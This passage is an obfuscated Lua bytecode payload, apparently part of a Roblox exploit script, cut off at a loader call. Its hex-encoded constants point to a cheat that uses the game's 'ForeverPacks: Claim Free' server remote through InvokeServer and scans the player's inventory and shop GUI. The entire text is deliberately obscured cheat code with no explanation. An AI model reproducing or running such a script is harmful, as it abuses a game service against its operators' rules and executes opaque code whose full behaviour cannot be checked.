00012Q00263Q00017Q000C3Q0003043Q0067616D65030A3Q004765745365727669636503073Q00506C6179657273030B3Q004C6F63616C506C6179657203093Q00506C61796572477569030D3Q004578636C757369766553686F7003053Q004672616D65030A3Q004974656D734672616D6503053Q004974656D7303123Q00526F77202D20466F7265766572205061636B03043Q005061636B03053Q0054696C6573000F3Q0012463Q00013Q0020445Q0002001240000200034Q002A3Q000200020020355Q00040020355Q00050020355Q00060020355Q00070020355Q00080020355Q00090020355Q000A0020355Q000B0020355Q000C2Q00258Q00263Q00017Q00063Q0003043Q0067616D65030A3Q004765745365727669636503113Q005265706C69636174656453746F7261676503073Q004C69627261727903063Q00436C69656E7403043Q005361766500093Q0012463Q00013Q0020445Q0002001240000200034Q002A3Q000200020020355Q00040020355Q00050020355Q00062Q00258Q00263Q00017Q00073Q00028Q0003043Q006E657874030B3Q004765744368696C6472656E03063Q00486F6C64657203083Q004974656D536C6F7403043Q0049636F6E03053Q00496D61676500213Q0012403Q00013Q0026073Q00010001000100041F3Q00010001001240000100013Q000E39000100040001000100041F3Q00040001001246000200024Q002900035Q0020440003000300032Q003700030002000400041F3Q001A0001001240000700014Q0009000800083Q000E390001000D0001000700041F3Q000D00010020350009000600040020350009000900050020350008000900060020350009000800072Q0029000A00013Q00061A0009001A0001000A00041F3Q001A00012Q0027000900014Q0006000900023Q00041F3Q001A000100041F3Q000D000100062F0002000B0001000200041F3Q000B00012Q002700026Q0006000200023Q00041F3Q0004000100041F3Q000100012Q00263Q00017Q00073Q0003043Q0067616D65030A3Q004765745365727669636503113Q005265706C69636174656453746F7261676503073Q004E6574776F726B03183Q00466F72657665725061636B733A20436C61696D2046722Q65030C3Q00496E766F6B6553657276657203073Q0044656661756C74000A3Q0012463Q00013Q0020445Q0002001240000200034Q002A3Q000200020020355Q00040020355Q00050020445Q0006001240000200074Q00193Q000200012Q00263Q00017Q00073Q00028Q0003043Q006E65787403093Q00496E76656E746F7279030A3Q00436F6E73756D61626C6503053Q007461626C6503043Q0066696E6403023Q00696400173Q0012403Q00013Q0026073Q00010001000100041F3Q00010001001246000100024Q002900025Q0020350002000200030020350002000200042Q0009000300033Q00041F3Q00110001001246000600053Q0020350006000600062Q0029000700013Q0020350008000500072Q002A00060008000200061C0006001100013Q00041F3Q001100012Q0006000400023Q00062F000100090001000200041F3Q000900012Q002700016Q0006000100023Q00041F3Q000100012Q00263Q00017Q00",v9(),...);